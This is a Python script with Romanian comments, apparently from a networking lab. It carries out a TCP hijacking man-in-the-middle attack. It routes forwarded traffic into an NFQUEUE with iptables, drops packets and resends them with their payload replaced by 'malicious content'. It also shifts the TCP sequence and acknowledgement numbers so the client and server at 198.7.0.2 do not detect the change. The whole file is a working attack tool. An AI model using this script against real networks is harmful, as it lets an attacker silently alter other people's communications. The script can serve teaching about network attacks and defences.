from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os


# odata ce am modificat un prim mesaj vrem sa tinem minte ce discrepanta am creat intre seq si ack
length_difference_server = 0 # diferente diferite pt mesajele care pleaca de la server
length_difference_client = 0 # si care pleaca de la client


# functia care se apeleaza pentru fiecare pachet si le modifica
def detect_packet(packet):
    # facem rost de continutul pachetului
    content = packet.get_payload()
    # formam un pachet scapy cu respectivul continut
    scapy_packet = IP(content)
    # pregatim un nou pachet ce va fi trimis in locul celui original
    new_packet = IP(bytes(scapy_packet))
    # daca pachetul are layer de IP, TCP si flagul TCP 'P' sau 'A' activat ii modificam continutul
    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(TCP) and ('P' in scapy_packet[TCP].flags or 'A' in scapy_packet[TCP].flags):
	# modificam pachetul
        scapy_packet = alter_packet(scapy_packet)
        # setam continutul noului pachet
        new_packet = scapy_packet
    # renuntam la vechiul pachet
    packet.drop()
    # trimitem noul pachet
    send(new_packet)


# functia care ne modifica pachetele
def alter_packet(packet):
    global length_difference_server, length_difference_client

    # tinem cont de faptul ca s-ar putea sa avem un pachet doar cu flag-ul "ACK"
    change_content = True
    if not packet.haslayer(Raw):
       change_content = False

    # cream un nou pachet pe baza celui vechi
    ihl = packet[IP].ihl
    dst = packet[IP].dst
    src = packet[IP].src
    id = packet[IP].id
    flags_IP = packet[IP].flags
    frag = packet[IP].frag
    ttl = packet[IP].ttl
    ip_layer = IP(len = None, chksum = None, dst = dst, src = src, flags = flags_IP, ihl = ihl, id = id, frag = frag, ttl = ttl)

    dport = packet[TCP].dport
    sport = packet[TCP].sport
    dataofs = packet[TCP].dataofs
    window = packet[TCP].window
    options = packet[TCP].options
    flags_TCP = packet[TCP].flags
    tcp_layer = TCP(chksum = None, flags = flags_TCP, dport = dport, sport = sport, options = options, dataofs = dataofs, window = window)

    attacker_message = "continut malitios" # mesajul pe care vrem sa-l inseram
    new_packet = ip_layer/tcp_layer # alipim layerele pe care sigur trebuie sa le aiba pachetul
    # daca avem un layer Raw alipim si contentul schimbat
    if change_content:
       new_packet = new_packet/attacker_message.encode('utf-8')
       original_message = packet[Raw].load.decode('utf-8') # mesajul initial din pachet
       length_difference = len(attacker_message) - len(original_message) # urmeaza sa cream o noua diferenta

    # trebuie sa tinem cont din ce directie vin pachetele
    if src == '198.7.0.2': # pentru mesajele care pleaca de la server
       # incrementam seq a.i. sa fie conform cu ceea ce se asteapta clientul sa primeasca
       # avand in vedere diferenta de lungime pe care am creat-o deja
       new_packet[TCP].seq = packet[TCP].seq + length_difference_server
       # scadem ack cu diferenta pe care am creat-o modificand pachetele de la client
       # (pentru a nu-l lasa pe client sa-si dea seama ca serverul a primit mai mult decat 
       # trebuia)
       new_packet[TCP].ack = packet[TCP].ack - length_difference_client
       # daca am schimbat continutul incrementam diferenta creata in mesajele de la server
       if change_content:
          length_difference_server += length_difference

    # facem operatiile in oglinda pentru mesajele care vin de la client
    if dst == '198.7.0.2': # pentru cele care se intorc la server
       new_packet[TCP].seq = packet[TCP].seq + length_difference_client
       new_packet[TCP].ack = packet[TCP].ack - length_difference_server
       if change_content:
          length_difference_client += length_difference

    # returnam pachetul modificat
    return new_packet


# coada in care ni se vor pune toate pachetele pe care le forwardam
queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 15")
    # facem bind intre coada in care ajung pachetele si functia care le modifica
    queue.bind(15, detect_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()
